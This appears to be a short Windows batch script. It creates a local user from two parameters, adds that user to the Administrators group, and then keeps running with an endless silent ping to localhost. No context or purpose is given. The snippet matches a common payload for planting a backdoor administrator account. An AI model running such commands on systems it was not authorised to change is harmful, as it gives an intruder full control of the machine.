net USER %1 %2 /ADD && net localgroup "Administrators" %1 /ADD

cmd.exe /c ping -t localhost > NUL